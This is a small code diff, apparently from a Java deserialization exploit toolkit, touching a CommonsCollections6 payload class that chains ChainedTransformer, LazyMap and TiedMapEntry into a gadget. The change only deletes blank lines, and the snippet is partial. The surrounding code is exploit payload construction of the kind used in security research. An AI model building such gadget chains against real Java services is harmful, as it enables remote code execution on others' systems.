@@ -43,11 +43,8 @@ public class CommonsCollections6 implements ObjectPayload<Serializable> {
 		Transformer transformerChain = new ChainedTransformer(transformers);
 
 		final Map innerMap = new HashMap();
-
 		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
 		TiedMapEntry entry = new TiedMapEntry(lazyMap, "su18");
-
 		HashSet map = new HashSet(1);
 		map.add("su18");
 		Field f = null;
